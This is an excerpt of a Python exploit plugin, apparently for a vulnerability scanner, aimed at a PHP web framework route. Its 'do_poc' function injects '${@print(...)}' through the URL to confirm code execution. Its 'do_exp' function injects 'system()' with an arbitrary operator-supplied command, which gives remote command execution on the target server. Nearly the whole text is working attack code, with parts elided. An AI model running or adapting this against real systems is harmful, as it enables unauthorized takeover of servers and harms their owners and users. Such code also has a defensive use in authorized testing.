...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        rp = requests.get(url + "/index.php/module/action/param1/$%7B@print(xiaohei)%7D",headers=heads,verify=False)
        if rp.status_code == 200 and 'xiaohei' in rp.text :
            result['Result'] = True
            result['Result_Info']= "a3=%0d%0avar_dump(xiaohei);%0d%0a//"
        return result
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    ...
    #Error_Info无论何时都会输出
        ...
        if exp_data['type']=='cmd':
            rp = requests.get(url+"/index.php/module/action/param1/$%7B@print(system("+exp_data['command']+"))%7D",headers=heads,verify=False)
            if rp.text !="":
                result['Result'] = True
